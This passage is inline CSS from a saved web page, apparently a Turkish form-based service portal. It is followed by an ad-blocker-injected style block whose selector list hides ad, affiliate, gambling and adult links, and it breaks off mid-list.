            padding: 0;
            font-weight: 400;
            list-style: none;
            text-decoration: none;
            display: block;
            border: 1px solid rgba(169, 172, 175, .5);
            padding: .5em;
            border-radius: .25em;
            background: #fff;
            color: #4284be;
            font-size: 90%;
            line-height: 1.33em;
            font-weight: 700;
        }
        .toolbar li a.green {
            color: #20a64c !important;
        }
        .toolbar li a i{
            padding-right:0.5rem;
        }
        .adimlar-text{
            border-radius: .5em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 11px 15px;
            margin: 4px 0;
            word-break: break-word;
            border: 1px dashed #a8acae;
            color: #4a4e50;
            background-color: rgba(58, 137, 180, .04);
        }
        .confirm, .reminder, .warning{
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            border-radius: .5em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 1em 1em 1em 4em;
            border: 1px solid #e7ebee;
            border-bottom-width: 2px;
            margin-bottom: 1em;
            background-position: 1em center;
            background-repeat: no-repeat;
            background-size: 2em 2em;
            min-height: 3em;
            color: #4b4e51;
        }
        .confirm{
            background-image: url(assets/form-confirm.svg);
            background-color: rgba(80, 175, 0, .05);
            border-color: #50af00;
        }
        .warning {
            background-image: url(assets/warning.svg);
            background-color: rgba(255, 165, 0, .05);
            border-color: orange;
        }
        .reminder{
            background-image: url(assets/form-reminder.svg);
            background-color: rgba(75, 135, 200, .05);
            border-color: #4b87c8;
        }
        legend em{
            display: inline-block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            width: 1.5em;
            height: 1.5em;
            background-color: #3a89b4;
            line-height: 1.5em;
            text-align: center;
            color: #FFF;
            font-style: normal;
            border-radius: 100%;
            margin-right: .25em;
        }
        .button {
            border-radius: .25em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            -webkit-box-shadow: 0 1px 2px #a8acae;
            box-shadow: 0 1px 2px #a8acae;
            border: 1px solid #a8acae;
            padding: .5em 1em;
            background-image: -webkit-gradient(linear, left top, left bottom, from(#FFF), to(#e7ebed));
            background-image: -o-linear-gradient(top, #FFF, #e7ebed);
            background-image: linear-gradient(to bottom, #FFF, #e7ebed);
            color: #4a4e50;
            height: 37.5px;
        }
        .submitForm {
            border: 1px solid #e7ebed;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 1em;
            border-radius: .5em;
        }
        .submitForm>fieldset {
            display: block;
        }
        .submitForm .satir {
            padding: 1em .5em 1.33em .5em;
            border-bottom: 1px dotted #e7ebed;
            -webkit-transition: background-color 1s;
            -o-transition: background-color 1s;
            transition: background-color 1s;
            position: relative;
            zoom: 1;
        }
        .submitForm .satir.singleRow .singleCheckGroupLine {
            width: 100% !important;
            margin-right: 0;
        }
        .submitForm .satir .singleCheckGroupLine {
            float: none;
            width: 100%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            margin-right: 1em;
        }
        .submitForm .satir .checkGroup, .submitForm .satir .checkGroupLine, .submitForm .satir .radioGroup, .submitForm .satir .radioGroupLine, .submitForm .satir .singleCheckGroupLine {
            float: left;
            display: block;
            background: #FFF;
            margin: 0;
            margin-right: .25em;
            padding: .5em;
            border: 1px solid #e7ebed;
            border-radius: .25em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }
        .submitForm .fieldInfo {
            padding-top: .5em;
            font-size: 85%;
            color: #4a4e50;
            clear: both;
        }
        .submitForm .satir .bilgilendirme {
            padding-top: .5em;
            font-size: 85%;
            color: #4a4e50;
            clear: both;
        }
        .submitForm .yildiz{
            color: #347aa1;
            font-weight: 400;
            position: relative;
            top: .1em;
        }
        fieldset {
            border: 0;
            margin: 0;
            padding: 0;
        }
        .sbmtBtn{
            border-top: 2px solid #4284be;
            padding: 2em 1em 2em 1em;
            margin: 1em 0 0 0;
            text-align: center;
            border-radius: 0 0 .5em .5em;
            background: rgba(66, 132, 190, .1);
        }
        .sbmtBtn .gonder {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            background: #3b77ac;
            color: #fff;
            border-radius: 1.25em;
            padding: .5em 1.5em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            height: 2.66em;
            margin-top: .25em;
            margin-bottom: .25em;
            margin-right: 1em;
            font-size: 109%;
            border: 1px rgba(59, 119, 172, .3) solid;
            -webkit-box-shadow: inset 0 .05em 0 rgba(255, 255, 255, .3), 0 .5em .5em -.5em rgba(0, 0, 0, .25);
            box-shadow: inset 0 .05em 0 rgba(255, 255, 255, .3), 0 .5em .5em -.5em rgba(0, 0, 0, .25);
        }
        .sbmtBtn .gonder {
            background: #3b77ac url(assets/button-right.svg) no-repeat right center;
            background-size: 1.4em 1.1em;
            padding-right: 2em;
        }
        .sbmtBtn .gonder.geri{
            background: #3b77ac url(assets/button-left.svg) no-repeat left center;
            padding-right: 1em;
            padding-left: 1em;
        }
        .sbmtBtn .gonder.empty{
            background: #3b77ac;
            padding-right: 1em;
            padding-left: 1em;
        }
        .pageHeader {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            padding: .5em;
            background: #e7ebee;
            margin: 1em 0;
            font-size: 100%;
            border-radius: .25em;
        }
        .pageHeaderArea dl {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            width: 100%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            overflow: hidden;
            color: #4b4e51;
        }
        .pageHeaderArea dl.compact dt {
            width: 25%;
        }

        .pageHeaderArea dl.compact dt, .pageHeaderArea dl.condensed dt {
            padding: .25em;
            margin-bottom: .5em;
            border-bottom: 1px rgba(66, 132, 190, .5) solid;
        }
        .pageHeaderArea dl dt {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 0 .25em;
            min-height: 30px;
            color: #346a99;
            font-weight: 600;
            width: 100%;
        }

        .pageHeaderArea dl.compact dd {
            width: 75%;
        }
        .pageHeaderArea dl dd {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            margin-bottom: .5em;
            padding: .25em;
            min-height: 30px;
            border-bottom: 1px rgba(66, 132, 190, .5) dotted;
            width: 100%;
        }
        .submitForm legend {
            color: #3a89b4;
            padding: 1em .5em;
            font-size: 15px;
        }
        .submitForm .satir label {
            display: block;
            font-weight: 500;
            padding-bottom: .25em;
        }
        .submitForm .satir .advdate[disabled], .submitForm .satir .date[disabled], .submitForm .satir .text[disabled], .submitForm .satir .treeSingle[disabled] {
            background: rgba(231, 235, 237, .5);
            border: 1px solid #a8acae;
            color: #4a4e50;
            cursor: not-allowed;
        }

        .submitForm .satir .advdate[readonly], .submitForm .satir .date[readonly], .submitForm .satir .text[readonly], .submitForm .satir .treeSingle[readonly] {
            background: rgba(231, 235, 237, .5);
            border: 1px solid #a8acae;
            color: #4a4e50;
        }
        .submitForm .satir.errored {
            background: #FFF4F4;
            margin: .5em 0;
            -webkit-box-shadow: 0 0 .33em rgba(207, 34, 28, .5);
            box-shadow: 0 0 .33em rgba(207, 34, 28, .5);
            border-bottom: none;
        }
        .submitForm .satir .fieldError {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            margin-bottom: .25em;
            padding-bottom: .25em;
            color: #830a0a;
            border-bottom: 1px solid rgba(131, 10, 10, .2);
            display: none;
        }
        .errored .fieldError{
            display: block!important;
        }
        .submitForm .satir .advdate, .submitForm .satir .date, .submitForm .satir .text, .submitForm .satir .treeSingle {
            margin: 0;
            padding: 7px;
            border: 1px solid #a8acae;
            border-radius: .25em;
            min-width: 20ex;
            width: 100%;
            height: 37px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            -webkit-box-shadow: 0 1px 2px #CCC;
            box-shadow: 0 1px 2px #CCC;
            background: #FFF;
        }
        .submitForm .satir:hover {
            background: rgba(231, 235, 237, .33);
            -webkit-transition: background-color 1s;
            -o-transition: background-color 1s;
            transition: background-color 1s;
        }
        .submitForm .satir .remainingChars+.textarea {
            border-radius: 0 0 .25em .25em;
            border-top: none;
            margin-top: 0;
        }
        .submitForm .satir .textarea[disabled] {
            background: rgba(231, 235, 237, .5);
            border: 1px solid #a8acae;
            color: #4a4e50;
            cursor: not-allowed;
        }
        .submitForm .satir .textarea {
            resize: vertical;
            margin: 0;
            padding: .5em;
            border: 1px solid #a8acae;
            border-radius: .25em;
            min-width: 20ex;
            min-height: 5em;
            width: 100%;
            -webkit-box-shadow: 0 1px 2px #CCC;
            box-shadow: 0 1px 2px #CCC;
            background: #FFF;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }
        .submitForm .satir .comboBox {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            border: 1px solid #a8acae;
            -webkit-box-shadow: 0 1px 2px #CCC;
            box-shadow: 0 1px 2px #CCC;
            background: #e7ebed;
            background-image: url(assets/selectdown.svg), -webkit-gradient(linear, left top, left bottom, from(#FFF), to(#e7ebed));
            background-image: url(assets/selectdown.svg), -o-linear-gradient(top, #FFF, #e7ebed);
            background-image: url(assets/selectdown.svg), linear-gradient(to bottom, #FFF, #e7ebed);
            background-repeat: no-repeat;
            background-size: 24px 24px, auto;
            background-position: right center;
            color: #4a4e50;
            border-radius: .25em;
            padding: .25em 2em .25em 1em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            height: 2.5em;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            margin-top: 0;
            margin-bottom: .25em;
        }
        .submitForm .row .satir{
            padding-right: 0!important;
        }
        .giris-btn{
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-flow: row nowrap;
            flex-flow: row nowrap;
            background-color: rgba(255, 255, 255, .9);
            -webkit-box-shadow: 0 0 5px 1px rgba(57, 58, 75, .63);
            box-shadow: 0 0 5px 1px rgba(57, 58, 75, .63);
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            border-radius: .5em;
            text-align: center;
            margin-left: 10px!important;
        }
        .giris-btn a {
            color: #4284be !important;
            text-decoration: none !important;
            width: 100%;
            padding: .5em .5em .5em 1em;
            display: block;
        }
        .satir input:read-only{
            color:#000!important;
        }
        .copyBtn{
            border: solid 1px #4284be;
            color: #4284be;
            background: #fff;
            border-radius: 5px;
            padding: 7px 10px;
            float: right;
            margin-top: -36px;
            z-index: 1231312;
            position: relative;
            font-size:13px;
        }
        @media (min-width: 40.063em) {
            .submitForm h2 em {
                font-size: 85%;
            }
            .submitForm .satir:not(.lg-form-row) {
                padding: 1em 15% 1.33em .5em;
            }
            .scroll-top {
                bottom: 20px;
                right: 20px;
                line-height: 48px;
                width: 50px;
                height: 50px;
                font-size: 1.5em;
            }
            footer .right-part {
                min-width: 18em;
                max-width: 18em;
                width: 18em;
                -webkit-box-orient: vertical;
                -webkit-box-direction: normal;
                -ms-flex-flow: column nowrap;
                flex-flow: column nowrap;
            }
            footer .inner .starts{
                -webkit-box-orient: horizontal;
                -webkit-box-direction: normal;
                -ms-flex-flow: row nowrap;
                flex-flow: row nowrap;
            }
            .box-header {
                -webkit-box-orient: horizontal;
                -webkit-box-direction: normal;
                -ms-flex-flow: row nowrap;
                flex-flow: row nowrap;
            }
            aside {
                display: block;
                -webkit-box-sizing: border-box;
                box-sizing: border-box;
                padding: .5em;
                margin: 0;
                border-bottom-left-radius: .5em !important;
                border-radius: 0;
                width: 25%;
                position: relative;
                min-height: 100vh;
            }
            content{
                -webkit-box-sizing: border-box;
                box-sizing: border-box;
                padding: 1.5em 1em 5em 1em;
                margin: 0;
                -webkit-box-shadow: -.5em 0 .5em -.5em rgba(75, 78, 81, .25);
                box-shadow: -.5em 0 .5em -.5em rgba(75, 78, 81, .25);
                width: 75%;
            }
        }
        @media (min-width: 64.063em) {
            .submitForm .satir:not(.lg-form-row) {
                padding: 1em 30% 1.33em .5em;
            }
            body {
                font-size: 15px;
            }
            footer .right-part {
                padding-top: 2em;
            }
            aside {
                padding: 2em;
                width: 20%;
            }
            content{
                padding: 2.5em 2em 5em 2em;
                width: 80%;
            }
        }

        @media (max-width: 700px) {
            .hideOnMobile{
                display: none!important;
            }
            .permissionNeeded img {
                margin-top: 30px;
                margin-left: auto;
                margin-right: auto;
                width: 130px;
                display: block;
                position: relative;
            }
            .permissionNeeded .warn-text {
                 padding-left: 1em;
            }
            footer .inner .starts {
                -webkit-box-orient: vertical;
                -webkit-box-direction: normal;
                -ms-flex-flow: column nowrap;
                flex-flow: column nowrap;
            }
            footer .right-part{
                -webkit-box-orient: horizontal;
                -webkit-box-direction: normal;
                -ms-flex-flow: row nowrap;
                flex-flow: row nowrap;
                min-height: 184px;
            }
            footer .foot-card {
                width: 100%;
            }
            footer .social-links {
                margin: 0 0 0 1em!important;
                display: grid!important;
                padding-left: 2rem !important;
            }
            footer .social-links a {
                width: 100%;
                -webkit-box-pack: center;
                -ms-flex-pack: center;
                justify-content: center;
                -webkit-box-align: center;
                -ms-flex-align: center;
                align-items: center;
            }
            .sub-copyright {
                margin-top: 0;
                padding-top: 1.5em;
                border-top: 1px dashed rgba(255, 255, 255, .25);
                border-bottom: 1px dashed rgba(255, 255, 255, .25);
                -webkit-box-orient: vertical;
                -webkit-box-direction: normal;
                -ms-flex-flow: column nowrap;
                flex-flow: column nowrap;
                -webkit-box-align: center;
                -ms-flex-align: center;
                align-items: center;
                display: block!important;
            }
            .sub-copyright .text1{
                text-align: center;
            }
            .menuList{
                padding-top:0!important;
            }
        }

        /* İade bilgilendirme paneli için özel stil */
        .iade-bilgilendirme {
            background-color: rgba(255, 165, 0, .05);
            border: 1px solid #ff8c00;
            border-radius: .5em;
            padding: 1em;
            margin-bottom: 1.5em;
            color: #4b4e51;
        }
        
        .iade-bilgilendirme h4 {
            color: #e67e00;
            margin: 0 0 .5em 0;
            font-size: 16px;
            font-weight: 600;
        }
        
        .iade-bilgilendirme p {
            margin: 0;
            font-size: 14px;
            line-height: 1.4;
        }

        table.resultTable {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            width: 100%;
            background: #fff;
            margin: 1em 0 0 0;
            -webkit-box-shadow: 0 .5em .5em -.5em rgba(0, 0, 0, .15);
            box-shadow: 0 .5em .5em -.5em rgba(0, 0, 0, .15);
            border-spacing: 0;
            color: #4b4e51;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }
        .caption {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            padding: .25em;
            background: rgba(169, 172, 175, .2);
            border: solid 1px #dddfe0;
            font-size: 100%;
            border-radius: .25em .25em 0 0;
            border-bottom: none;
            text-align: left;
            text-shadow: 1px 1px 0 rgba(255, 255, 255, .5);
            -webkit-box-shadow: 0 .5em .5em -.5em rgba(0, 0, 0, .25);
            box-shadow: 0 .5em .5em -.5em rgba(0, 0, 0, .25);
            position: relative;
            color: #4b4e51;
        }
        table.resultTable th {
            font-weight: 600;
            background: rgba(169, 172, 175, .1);
            text-shadow: 1px 1px 0 rgba(255, 255, 255, .5);
        }
        table.resultTable td, table.resultTable th {
            padding: .25em;
            border-collapse: collapse;
            text-align: left;
            border: solid 1px #dddfe0;
            background: #fff;
        }
        table.resultTable td a:not(.table-link), table.resultTable th a:not(.table-link) {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            text-decoration: none;
            font-size: 95%;
            margin: 2px 0 1px 0;
            background: rgba(59, 119, 172, .8);
            display: inline-block;
            line-height: 1.3em;
            color: #fff;
            border-radius: .33em;
            padding: .33em .5em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            background: #3b77ac;
        }
        table.resultTable.striped tr:nth-child(2n) td {
            background: rgba(169, 172, 175, .1);
        }
        dl {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            width: 100%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            overflow: hidden;
            color: #4b4e51;
        }
        dl.compact dt {
            width: 25%;
        }
        dl.compact dt, dl.condensed dt {
            padding: .25em;
            margin-bottom: .5em;
            border-bottom: 1px rgba(66, 132, 190, .5) solid;
        }
        dl dt {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 0 .25em;
            min-height: 30px;
            color: #346a99;
            font-weight: 600;
            width: 100%;
        }
        dl.compact dd {
            width: 75%;
        }
        dl dd {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            margin-bottom: .5em;
            padding: .25em;
            min-height: 30px;
            border-bottom: 1px rgba(66, 132, 190, .5) dotted;
            width: 100%;
        }
        #pdfPanel {
            border: 1px solid #a9acaf;
            margin: 0;
            padding: .5em .5em .25em .5em;
            -webkit-box-shadow: 0 .25em .5em rgba(75, 78, 81, .5);
            box-shadow: 0 .25em .5em rgba(75, 78, 81, .5);
            background: #fff;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            overflow: hidden;
            border-radius: .25em;
            text-align: center;
        }
        .frame1{
            width: 100%;
            height: 800px;
        }
    </style>
<style type="text/css">:root img[width="728"][height="90"], :root [href="https://adstub.net/cina777/"], :root [href="https://adstub.net/arab777/"], :root [href="https://adstub.net/ratu89/"], :root [href="https://adstub.net/judi89/"], :root [href^="//mage98rquewz.com/"], :root [href^="//x4pollyxxpush.com/"], :root span[id^="ezoic-pub-ad-placeholder-"], :root ins.adsbygoogle[data-ad-slot], :root ins.adsbygoogle[data-ad-client], :root img[src^="https://s-img.adskeeper.com/"], :root guj-ad, :root gpt-ad, :root div[id^="zergnet-widget"], :root div[id^="vuukle-ad-"], :root div[id^="taboola-stream-"], :root div[id^="sticky_ad_"], :root div[id^="st"][style^="z-index: 999999999;"], :root div[id^="gpt_ad_"], :root div[id^="ezoic-pub-ad-"], :root div[id^="dfp-ad-"], :root div[id^="crt-"][style], :root div[id^="adspot-"], :root div[id^="adrotate_widgets-"], :root ps-connatix-module, :root div[id^="ad_position_"], :root div[id^="ad-div-"], :root div[id*="ScriptRoot"], :root div[id*="MarketGid"], :root [href="https://adstub.net/rusia777/"], :root div[data-id-advertdfpconf], :root div[data-dfp-id], :root hl-adsense, :root div[data-contentexchange-widget], :root div[data-alias="300x250 Ad 2"], :root div[data-adzone], :root div[data-adunit-path], :root div[data-adname], :root div[data-ad-targeting], :root div[data-ad-region], :root div[data-ad-placeholder], :root div[aria-label="Ads"], :root display-ads, :root display-ad-component, :root atf-ad-slot, :root aside[id^="adrotate_widgets-"], :root amp-fx-flying-carpet, :root amp-embed[type="taboola"], :root amp-connatix-player, :root amp-ad-custom, :root amp-ad, :root div[id^="google_dfp_"], :root ad-slot, :root ad-shield-ads, :root a[style="width:100%;height:100%;z-index:10000000000000000;position:absolute;top:0;left:0;"], :root a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"] + .ob_source, :root a[onclick^="window.location.replace('https://random-affiliate.atimaze.com/"], :root a[href^="https://xbet-4.com/"], :root div[id^="ad-position-"], :root a[href^="https://www.toprevenuegate.com/"], :root a[href^="https://www.purevpn.com/"][href*="&utm_source=aff-"], :root a[href^="https://www.privateinternetaccess.com/"] > img, :root a[href^="https://financeads.net/tc.php?"], :root a[href^="https://www.mrskin.com/tour"], :root a[href^="https://www.infowarsstore.com/"] > img, :root a[href^="https://www.highperformancecpmgate.com/"], :root a[href^="https://www.highcpmrevenuenetwork.com/"], :root a[href^="https://www.get-express-vpn.com/offer/"], :root a[href^="https://lnkxt.bannerator.com/"], :root a[href^="https://www.geekbuying.com/dynamic-ads/"], :root a[href^="https://www.financeads.net/tc.php?"], :root a[href^="https://www.effectiveratecpm.com/"], :root [href^="https://www.herbanomic.com/"] > img, :root a[href^="https://maymooth-stopic.com/"], :root a[href^="https://www.dql2clk.com/"], :root a[href^="https://www.nutaku.net/signup/landing/"], :root a[href^="https://www.dating-finder.com/signup/?ai_d="], :root a[href^="https://explore-site.com/"], :root a[href^="https://www.brazzersnetwork.com/landing/"], :root [data-template-type="nativead"], :root a[href^="https://www.endorico.com/Smartlink/"], :root a[href^="https://www.adultempire.com/"][href*="?partner_id="], :root a[href^="https://voluum.prom-xcams.com/"], :root a[href^="https://twinrdsyte.com/"], :root a[href^="https://twinrdsrv.com/"], :root a[href^="https://trk.nfl-online-streams.club/"], :root a[href^="https://tracking.avapartner.com/"], :root a[href^="https://track.wg-aff.com"], :root a[href^="https://track.ultravpn.com/"], :root a[href^="https://track.afcpatrk.com/"], :root a[href^="https://torguard.net/aff.php"] > img, :root [data-identity="adhesive-ad"], :root a[href^="https://tc.tradetracker.net/"] > img, :root a[href^="https://tatrck.com/"], :root a[href^="https://click.candyoffers.com/"], :root [href^="https://zstacklife.com/"] img, :root a[href^="https://t.aslnk.link/"], :root a[href^="https://t.adating.link/"], :root a[href^="https://go.trackitalltheway.com/"], :root [href^="https://track.fiverr.com/visit/"] > img, :root a[href^="https://syndication.exoclick.com/"], :root a[href^="https://syndication.dynsrvtbg.com/"], :root div[data-alias="300x250 Ad 1"], :root a[href^="https://syndicate.contentsserved.com/"], :root a[href^="https://svb-analytics.trackerrr.com/"], :root a[href^="https://track.aftrk5.com/"], :root a[href^="https://slkmis.com/"], :root a[href^="https://myclick-2.com/"], :root a[href^="https://sexynearme.com/"], :root [data-ad-manager-id], :root a[href^="https://s.zlinkr.com/"], :root bottomadblock, :root a[href^="https://s.zlinkd.com/"], :root [href="https://adstub.net/gaza88/"], :root a[href^="https://ad.doubleclick.net/"], :root a[href^="https://static.fleshlight.com/images/banners/"], :root a[href^="https://s.zlink7.com/"], :root a[href^="https://s.zlink3.com/"], :root a[href^="https://www.mrskin.com/account/"], :root a[href^="https://s.optzsrv.com/"], :root a[href^="https://s.ma3ion.com/"], :root a[href^="https://s.eunow4u.com/"], :root #kt_player > div[style$="display: block;"][style*="inset: 0px;"], :root [href$="/sexdating.php"], :root a[href^="https://quotationfirearmrevision.com/"], :root a[href^="https://pubads.g.doubleclick.net/"], :root a[href^="https://prf.hn/click/"][href*="/camref:"] > img, :root a[href^="https://www.dating-finder.com/?ai_d="], :root a[href^="https://serve.awmdelivery.com/"], :root a[href^="https://prf.hn/click/"][href*="/adref:"] > img, :root app-ad, :root [href^="https://ap.octopuspop.com/click/"] > img, :root a[href^="https://postback1win.com/"], :root a[href^="https://mmwebhandler.aff-online.com/"], :root a[href^="https://www.bet365.com/"][href*="affiliate="], :root a[href^="https://pb-track.com/"], :root a[href^="https://pb-front.com/"], :root a[href^="https://paid.outbrain.com/network/redir?"], :root a[href^="https://streamate.com/landing/click/"], :root div[class^="Adstyled__AdWrapper-"], :root a[href^="https://osfultrbriolenai.info/"], :root a[href^="https://upsups.click/"], :root a[href^="https://ndt5.net/"], :root a[href^="https://natour.naughtyamerica.com/track/"], :root a[href^="https://mediaserver.entainpartners.com/renderBanner.do?"], :root a[href^="https://lead1.pl/"], :root a[href^="https://landing.brazzersnetwork.com/"], :root a[href^="https://join.virtuallust3d.com/"], :root a[href^="https://kiksajex.com/"], :root a[href^="https://juicyads.in/"], :root a[href^="https://snowdayonline.xyz/"], :root a[href^="https://mediaserver.gvcaffiliates.com/renderBanner.do?"], :root a[href^="https://join.dreamsexworld.com/"], :root a[href^="https://join.bannedsextapes.com/track/"], :root a[href^="https://jaxofuna.com/"], :root a[href^="https://italarizege.xyz/"], :root a[href^="https://iqbroker.com/"][href*="?aff="], :root a[href^="https://identicaldrench.com/"], :root a[href^="https://hot-growngames.life/"], :root a[href^="https://helmethomicidal.com/"], :root a[href^="https://golinks.work/"], :root a[href^="https://s.zlinkn.com/"], :root a[href^="https://go.xxxvjmp.com/"], :root a[href^="https://go.xxxjmp.com"], :root [class^="tile-picker__CitrusBannerContainer-sc-"], :root a[href^="https://go.xxxiijmp.com"], :root a[href^="https://go.xtbaffiliates.com/"], :root [data-role="tile-ads-module"], :root a[href^="https://go.xlviirdr.com"], :root div[class$="-adlabel"], :root a[href^="https://go.xlviiirdr.com"], :root a[href^="https://ismlks.com/"], :root [href^="https://www.mypillow.com/"] > img, :root a[href^="https://go.xlirdr.com"], :root [data-css-class="dfp-inarticle"], :root a[href^="https://l.hyenadata.com/"], :root a[href^="https://go.tmrjmp.com"], :root a[href^="https://zirdough.net/"], :root a[href^="https://s.deltraff.com/"], :root a[href^="https://go.markets.com/visit/?bta="], :root a[href^="https://billing.purevpn.com/aff.php"] > img, :root a[href^="https://go.hpyrdr.com/"], :root a[href^="https://lijavaxa.com/"], :root a[href^="https://go.goaserv.com/"], :root a[href^="https://t.hrtye.com/"], :root a[href^="https://go.etoro.com/"] > img, :root a[href^="https://go.dmzjmp.com"], :root a[href^="https://www.bang.com/?aff="], :root #mgb-container > #mgb, :root a[href^="https://go.admjmp.com"], :root a[href^="https://ak.stikroltiltoowi.net/"], :root a[href^="https://get.surfshark.net/aff_c?"][href*="&aff_id="] > img, :root a[href^="https://www.adskeeper.com"], :root a[data-redirect^="https://paid.outbrain.com/network/redir?"], :root [href^="https://clicks.affstrack.com/"] > img, :root a[href^="https://engine.phn.doublepimp.com/"], :root a[href^="https://engine.blueistheneworanges.com/"], :root a[href^="https://drumskilxoa.click/"], :root a[href^="https://dl-protect.net/"], :root a[href*=".foxqck.com/"], :root a[href^="https://ctosrd.com/"], :root a[href^="https://clixtrac.com/"], :root [href^="https://noqreport.com/"] > img, :root a[href^="https://clicks.pipaffiliates.com/"], :root app-advertisement, :root a[href^="https://getmatchedlocally.com/"], :root a[href^="https://clickins.slixa.com/"], :root a[href^="https://datewhisper.life/"], :root a[href^="https://get-link.xyz/"], :root a[href^="https://click.linksynergy.com/fs-bin/"] > img, :root a[href^="https://combodef.com/"], :root a[href^="https://click.hoolig.app/"], :root a[href^="https://www.onlineusershielder.com/"], :root a[href^="https://click.ggpickaff.com/"], :root a[href^="https://track.totalav.com/"], :root a[href^="https://ctrdwm.com/"], :root img[src^="https://images.purevpnaffiliates.com"], :root a[href^="https://porntubemate.com/"], :root a[href^="https://clickadilla.com/"], :root a[href^="https://click.dtiserv2.com/"], :root a[href^="https://www.adxsrve.com/"], :root a[href^="https://click.Ggpickaff.com/"], :root a[href^="https://go.xlvirdr.com"], :root a[href^="http://www.iyalc.com/"], :root a[href^="https://stardomcoit.com/"], :root a[href^="https://claring-loccelkin.com/"], :root a[href^="https://bongacams2.com/track?"], :root a[href^="https://t.ajrkm1.com/"], :root a[href^="https://bongacams10.com/track?"], :root a[href^="https://www.sheetmusicplus.com/"][href*="?aff_id="], :root a[href^="https://bngpt.com/"], :root a[href^="https://black77854.com/"], :root a[href^="http://annulmentequitycereals.com/"], :root [data-taboola-options], :root a[href^="https://believessway.com/"], :root a[href^="https://Click.ggpickaff.com/"], :root a[href^="https://banners.livepartners.com/"], :root a[href^="http://revolvemockerycopper.com/"], :root a[href^="https://awptjmp.com/"], :root a[href^="https://join.sexworld3d.com/track/"], :root a[href^="https://aweptjmp.com/"], :root a[href^="https://ausoafab.net/"], :root a[href^="https://aj1070.online/"], :root a[href^="https://bc.game/"], :root a[href^="https://ak.oalsauwy.net/"], :root a[href^="https://a.bestcontentoperation.top/"], :root a[href^="https://adultfriendfinder.com/go/"], :root a[href^="https://ads.planetwin365affiliate.com/"], :root a[href^="https://ads.leovegas.com/"], :root .nya-slot[style], :root a[href^="https://a.bestcontentweb.top/"], :root a[href^="https://a2.adform.net/"], :root a[href^="https://a.candyai.love/"], :root a[href^="https://playnano.online/offerwalls/?ref="], :root a[href^="https://a.adtng.com/"], :root .banner-img > .pbl, :root [data-m-ad-id], :root a[href^="https://a-ads.com/"], :root [id^="ad_slider"], :root a[href^="https://click.ggpickyaff.com/"], :root broadstreet-zone-container, :root a[href^="https://ak.psaltauw.net/"], :root a[href^="https://1winpb.com/"], :root div[id^="rc-widget-"], :root a[href^="https://turnstileunavailablesite.com/"], :root a[href^="https://chaturbate.com/in/?"], :root a[href^="https://prf.hn/click/"][href*="/creativeref:"] > img, :root a[href*="&maxads="], :root a[href^="http://www.adultempire.com/unlimited/promo?"][href*="&partner_id="], :root a[href^="https://1betandgonow.com/"], :root div[id^="optidigital-adslot"], :root [href^="https://wsup.ai/"], :root a[href^="https://123-stream.org/"], :root a[href^="https://in.rabbtrk.com/"], :root a[href^="http://www.h4trck.com/"], :root a[href^="http://www.friendlyduck.com/AF_"], :root a[href^="http://partners.etoro.com/"], :root [href="https://chaturbate.jjgirls.com/"] > img, :root a[href^="http://cam4com.go2cloud.org/aff_c?"], :root a[href^="https://ads.betfair.com/redirect.aspx?"], :root a[href^="http://trk.globwo.online/"], :root a[href^="http://troopsassistedstupidity.com/"], :root a[href^="https://random-affiliate.atimaze.com/"], :root a-ad, :root a[href^="https://offhandpump.com/"], :root a[href^="http://stickingrepute.com/"], :root #slashboxes > .deals-rail, :root a[href^="http://join.brokestraightboys.com/track/"], :root a[href^="http://roadcontagion.com/"], :root a[href^="http://premonitioninventdisagree.com/"], :root [href^="http://mypillow.com/"] > img, :root a[href^="http://bongacams.com/track?"], :root a[href^="https://track.adform.net/"], :root a[href^="http://avthelkp.net/"], :root a[href^="https://a.medfoodhome.com/"], :root a[href^="https://engine.flixtrial.com/"], :root [data-type="ad-vertical"], :root a[href^="//startgaming.net/tienda/" i], 